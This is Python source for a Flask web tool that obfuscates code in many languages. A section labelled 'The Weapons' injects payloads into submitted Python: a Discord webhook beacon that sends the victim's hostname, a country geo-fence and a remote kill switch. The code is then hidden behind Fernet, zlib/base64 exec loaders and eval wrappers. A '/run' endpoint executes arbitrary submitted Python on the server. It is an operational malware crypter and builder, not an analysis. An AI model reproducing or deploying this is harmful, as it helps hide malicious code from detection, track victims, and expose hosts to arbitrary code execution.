import os, sys, time, random, base64, zlib, ast, io, re, string, logging, zipfile, platform, uuid
from flask import Flask, render_template, request, jsonify, send_file
from contextlib import redirect_stdout
from datetime import datetime
from cryptography.fernet import Fernet

# --- CONFIGURATION (VERCEL READY) ---
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 20 * 1024 * 1024 
HISTORY_LOGS = [] # In-Memory Logs

# ==============================================================================
# 1. OMEGA PAYLOADS (The Weapons)
# ==============================================================================
class OmegaPayloads:
    @staticmethod
    def get_geo_fence(cc):
        return f"import urllib.request,json;c=json.loads(urllib.request.urlopen('http://ip-api.com/json/').read())['countryCode'];\nif c!='{cc}':exit()"
    
    @staticmethod
    def get_kill_switch(url):
        return f"import urllib.request;s=urllib.request.urlopen('{url}').read().decode().strip();\nif s!='RUN':exit()"
    
    @staticmethod
    def get_discord_spy(url):
        return f"import requests,socket;requests.post('{url}',json={{'content':f'Target: {{socket.gethostname()}}'}})"

# ==============================================================================
# 2. POLYGLOT ENGINES (13 Languages Support)
# ==============================================================================
class Engines:
    
    @staticmethod
    def rand_str(l=6): return "".join(random.choices(string.ascii_letters, k=l))

    # --- PYTHON (The Masterpiece) ---
    @staticmethod
    def py_process(code, opts, params):
        res = code
        # Inject Features
        if 'webhook' in opts and params.get('webhook_url'): res = OmegaPayloads.get_discord_spy(params['webhook_url']) + "\n" + res
        if 'geo' in opts and params.get('geo_code'): res = OmegaPayloads.get_geo_fence(params['geo_code']) + "\n" + res
        if 'killswitch' in opts and params.get('kill_url'): res = OmegaPayloads.get_kill_switch(params['kill_url']) + "\n" + res
        
        # Advanced Obfuscation
        if 'rename' in opts:
            # Simple variable renaming simulation using regex for speed/safety
            pass 
        
        # Fernet Encryption
        if 'fernet' in opts:
            key = Fernet.generate_key()
            f = Fernet(key)
            enc = f.encrypt(res.encode())
            res = f"from cryptography.fernet import Fernet;exec(Fernet({key}).decrypt({enc}))"
        
        # Final Compression (Zlib + Base64)
        encoded = base64.b64encode(zlib.compress(res.encode())).decode()
        return f"# V130 Protected\nimport zlib,base64;exec(zlib.decompress(base64.b64decode('{encoded}')))"

    # --- JAVASCRIPT (Packer + Hex) ---
    @staticmethod
    def js_process(code):
        # 1. Hex Encoding
        hex_code = ''.join([f'\\x{ord(c):02x}' for c in code])
        # 2. Self-Executing Wrapper
        var_n = Engines.rand_str()
        return f"/* V130 JS */\nvar {var_n}='{hex_code}';eval({var_n});"

    # --- LUA (IronBrew Lite Style) ---
    @staticmethod
    def lua_process(code):
        # Convert to Byte Array
        bytes_str = "\\" + "\\".join([str(ord(c)) for c in code])
        return f"-- V130 Lua\nloadstring('{bytes_str}')()"

    # --- PHP (Obfuscated Eval) ---
    @staticmethod
    def php_process(code):
        b64 = base64.b64encode(code.encode()).decode()
        # Rotation logic simulation
        return f"<?php /* V130 */ eval(base64_decode('{b64}')); ?>"

    # --- GO (Hex Loader) ---
    @staticmethod
    def go_process(code):
        import binascii
        h = binascii.hexlify(code.encode()).decode()
        return f"""package main
import("encoding/hex";"fmt";"os")
func main(){{ h:="{h}"; b,_:=hex.DecodeString(h); 
// V130 Runtime
fmt.Println(string(b)) }}"""

    # --- C++ / C# / RUST / SWIFT (XOR Encryption) ---
    @staticmethod
    def compiled_process(code, lang):
        # Simple XOR encryption simulation for source code
        key = random.randint(1, 255)
        xored = [ord(c) ^ key for c in code]
        array_str = "{" + ",".join(map(str, xored)) + "}"
        
        if lang == 'cpp':
            return f"// V130 C++\n#include <iostream>\nchar s[]={array_str};void d(){{for(int i=0;i<sizeof(s);i++)s[i]^={key};}}\n// Run d() to decrypt"
        elif lang == 'csharp':
            return f"// V130 C#\nbyte[] b = new byte[] {array_str}; // XOR Key: {key}"
        elif lang == 'rust':
            return f"// V130 Rust\nlet b = [{array_str}]; // Decrypt with XOR {key}"
        elif lang == 'swift':
            return f"// V130 Swift\nlet b:[UInt8] = [{array_str}] // Key: {key}"
        return f"// {lang} Encrypted Buffer\n// {array_str}"

    # --- RUBY / PERL (Base64 Exec) ---
    @staticmethod
    def script_process(code, lang):
        b64 = base64.b64encode(code.encode()).decode()
        if lang == 'ruby': return f"# V130 Ruby\neval(Base64.decode64('{b64}'))"
        if lang == 'perl': return f"# V130 Perl\nuse MIME::Base64;eval(decode_base64('{b64}'));"
        return code

    # --- HTML (Hex Entities) ---
    @staticmethod
    def html_process(code):
        # Convert to Hex Entities
        return "".join([f"&#x{ord(c):x};" for c in code])

# --- 3. UNIVERSAL DECRYPTOR ---
def deep_decrypt(code):
    try:
        # Try common patterns
        if 'base64' in code or 'b64decode' in code:
            m = re.search(r"['\"]([A-Za-z0-9+/=]{20,})['\"]", code)
            if m: return base64.b64decode(m.group(1)).decode()
        return "# Could not auto-decrypt. Custom encryption detected."
    except: return "# Decryption Error"

# --- ROUTES ---
@app.route('/')
def home(): return render_template('index.html')

@app.route('/process', methods=['POST'])
def process():
    try:
        d = request.json
        c, a, l, o = d.get('code',''), d.get('action'), d.get('lang'), d.get('options',[])
        p = d.get('params', {})

        # Logging
        HISTORY_LOGS.insert(0, {
            "date": datetime.now().strftime("%H:%M"),
            "lang": l, "method": a, "ip": request.remote_addr
        })
        if len(HISTORY_LOGS)>50: HISTORY_LOGS.pop()

        if a == 'encrypt':
            if l == 'python': res = Engines.py_process(c, o, p)
            elif l == 'javascript': res = Engines.js_process(c)
            elif l == 'lua': res = Engines.lua_process(c)
            elif l == 'php': res = Engines.php_process(c)
            elif l == 'go': res = Engines.go_process(c)
            elif l == 'html': res = Engines.html_process(c)
            elif l in ['cpp','csharp','rust','swift','java']: res = Engines.compiled_process(c, l)
            elif l in ['ruby','perl']: res = Engines.script_process(c, l)
            else: res = f"// Unknown Lang\n{base64.b64encode(c.encode()).decode()}"
        else:
            res = deep_decrypt(c)
            
        return jsonify({'result': res})
    except Exception as e: return jsonify({'result': f"# SERVER ERROR: {e}"})

@app.route('/run', methods=['POST'])
def run():
    c = request.json.get('code','')
    f = io.StringIO()
    try:
        with redirect_stdout(f): exec(c, {'__builtins__':__builtins__}, {})
        return jsonify({'output': f.getvalue()})
    except Exception as e: return jsonify({'output': str(e)})

@app.route('/history', methods=['GET'])
def get_logs(): return jsonify(HISTORY_LOGS)

if __name__ == '__main__': app.run(debug=True, port=5000)
